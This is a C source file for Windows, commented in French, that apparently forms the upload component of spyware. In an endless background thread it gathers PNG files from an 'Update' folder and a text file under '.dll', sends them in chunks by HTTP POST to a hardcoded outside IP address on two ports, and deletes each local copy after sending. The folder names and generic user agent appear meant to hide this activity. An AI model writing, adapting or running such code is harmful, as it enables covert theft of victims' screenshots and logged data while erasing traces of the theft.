#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <winhttp.h>
#include <time.h>
#include <direct.h>
#include <pthread.h>  // Pour les threads

#pragma comment(lib, "winhttp.lib")

#define SERVER_URL      L"144.172.84.133"  // Remplace par l'adresse de ton serveur
#define SERVER_PORT     8080  // Port du serveur principal pour les .png
#define SERVER_PATH     L"/"
#define DEDICATED_PORT  8081  // Port du serveur dédié pour les .txt
#define CHUNK_SIZE      (1024 * 1024)  // Taille de chaque segment (1MB)
#define MAX_PNG_SENDS   5  // Nombre d'envois de .png avant d'envoyer le .txt
#define WAIT_TIME       10  // Temps d'attente entre chaque cycle d'envoi (en secondes)

// Fonction pour envoyer les fichiers .png
void send_png(const wchar_t* filepath) {
    FILE* fp = _wfopen(filepath, L"rb");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    size_t filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    size_t total_chunks = (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    wchar_t* filename = wcsrchr(filepath, L'\\');
    if (!filename) filename = (wchar_t*)filepath;
    else filename++;

    BYTE* buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(fp);
        return;
    }

    HINTERNET hSession = WinHttpOpen(L"SenderApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, SERVER_PORT, 0);

    for (size_t i = 0; i < total_chunks; i++) {
        DWORD to_read = CHUNK_SIZE;
        if ((i + 1) * CHUNK_SIZE > filesize)
            to_read = filesize - i * CHUNK_SIZE;

        fread(buffer, 1, to_read, fp);

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
                                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        wchar_t seg_header[64], total_header[64];
        wchar_t headers[512];
        swprintf(seg_header, 64, L"%d", (int)i);
        swprintf(total_header, 64, L"%d", (int)total_chunks);
        swprintf(headers, 512,
            L"X-Filename: %s\r\n"
            L"X-File-Type: png\r\n"
            L"X-Segment-Number: %s\r\n"
            L"X-Total-Segments: %s\r\n",
            filename, seg_header, total_header);

        WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        BOOL res = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      buffer, to_read, to_read, 0);
        if (res) WinHttpReceiveResponse(hRequest, NULL);
        else wprintf(L"Erreur HTTP: %s (%d)\n", filename, i);

        WinHttpCloseHandle(hRequest);
        Sleep(2);  // Pause douce pour éviter un envoi trop rapide
    }

    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    fclose(fp);
    free(buffer);

    _wremove(filepath);
    wprintf(L"Fichier supprimé: %s\n", filepath);
}

// Fonction pour envoyer le fichier .txt au serveur dédié
void send_txt(const wchar_t* filepath) {
    FILE* fp = _wfopen(filepath, L"rb");
    if (!fp) return;

    fseek(fp, 0, SEEK_END);
    size_t filesize = ftell(fp);
    fseek(fp, 0, SEEK_SET);

    size_t total_chunks = (filesize + CHUNK_SIZE - 1) / CHUNK_SIZE;
    wchar_t* filename = wcsrchr(filepath, L'\\');
    if (!filename) filename = (wchar_t*)filepath;
    else filename++;

    BYTE* buffer = malloc(CHUNK_SIZE);
    if (!buffer) {
        fclose(fp);
        return;
    }

    HINTERNET hSession = WinHttpOpen(L"SenderApp/1.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
    HINTERNET hConnect = WinHttpConnect(hSession, SERVER_URL, DEDICATED_PORT, 0);

    for (size_t i = 0; i < total_chunks; i++) {
        DWORD to_read = CHUNK_SIZE;
        if ((i + 1) * CHUNK_SIZE > filesize)
            to_read = filesize - i * CHUNK_SIZE;

        fread(buffer, 1, to_read, fp);

        HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", SERVER_PATH,
                                NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, 0);

        wchar_t seg_header[64], total_header[64];
        wchar_t headers[512];
        swprintf(seg_header, 64, L"%d", (int)i);
        swprintf(total_header, 64, L"%d", (int)total_chunks);
        swprintf(headers, 512,
            L"X-Filename: %s\r\n"
            L"X-File-Type: output_text\r\n"
            L"X-Segment-Number: %s\r\n"
            L"X-Total-Segments: %s\r\n",
            filename, seg_header, total_header);

        WinHttpAddRequestHeaders(hRequest, headers, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);
        BOOL res = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                      buffer, to_read, to_read, 0);
        if (res) WinHttpReceiveResponse(hRequest, NULL);
        else wprintf(L"Erreur HTTP: %s (%d)\n", filename, i);

        WinHttpCloseHandle(hRequest);
        Sleep(2);  // Pause douce pour éviter un envoi trop rapide
    }

    WinHttpCloseHandle(hConnect);
    WinHttpCloseHandle(hSession);
    fclose(fp);
    free(buffer);

    _wremove(filepath);
    wprintf(L"Fichier supprimé: %s\n", filepath);
}

// Fonction pour obtenir les fichiers PNG dans un dossier
int get_png_files(const wchar_t* folder_path, wchar_t*** files, int* file_count) {
    WIN32_FIND_DATAW findFileData;
    HANDLE hFind = FindFirstFileW(folder_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 0;  // Aucun fichier trouvé
    }

    // Compte les fichiers .png dans le dossier
    int count = 0;
    do {
        if (wcsstr(findFileData.cFileName, L".png")) {
            count++;
        }
    } while (FindNextFileW(hFind, &findFileData) != 0);
    FindClose(hFind);

    // Alloue de la mémoire pour les fichiers
    *files = (wchar_t**)malloc(count * sizeof(wchar_t*));
    if (*files == NULL) {
        return 0;
    }

    // Remet à zéro le compteur
    *file_count = 0;

    // Recherche et récupère les fichiers .png
    hFind = FindFirstFileW(folder_path, &findFileData);
    if (hFind == INVALID_HANDLE_VALUE) {
        return 0;
    }

    while (FindNextFileW(hFind, &findFileData) != 0) {
        if (wcsstr(findFileData.cFileName, L".png")) {
            (*files)[*file_count] = _wcsdup(findFileData.cFileName);
            (*file_count)++;
        }
    }

    FindClose(hFind);
    return 1;
}

// Fonction exécutée dans un thread pour envoyer les fichiers .png et .txt
DWORD WINAPI process_files(void* arg) {
    int png_send_count = 0;
    wchar_t* txt_filepath = L".dll\\file_to_send.txt";

    while (1) {
        wchar_t* folder_path = L"Update";
        wchar_t** png_files = NULL;
        int png_file_count = 0;

        // Récupérer les fichiers .png dans le dossier Update
        get_png_files(folder_path, &png_files, &png_file_count);

        // Si aucun fichier .png trouvé, on attend
        if (png_file_count == 0) {
            wprintf(L"Aucun fichier .png trouvé dans %s. Attente...\n", folder_path);
            Sleep(WAIT_TIME * 1000);  // Attendre X secondes avant de recommencer
            continue;
        }

        // Envoyer les fichiers .png
        for (int i = 0; i < png_file_count && png_send_count < MAX_PNG_SENDS; i++) {
            send_png(png_files[i]);
            free(png_files[i]);
        }

        png_send_count++;
        free(png_files);

        // Si 5 envois de .png effectués, envoyer le .txt
        if (png_send_count >= MAX_PNG_SENDS) {
            send_txt(txt_filepath);
            png_send_count = 0;  // Réinitialiser le compteur
        }

        // Attendre avant de répéter
        Sleep(WAIT_TIME * 1000);
    }

    return 0;
}
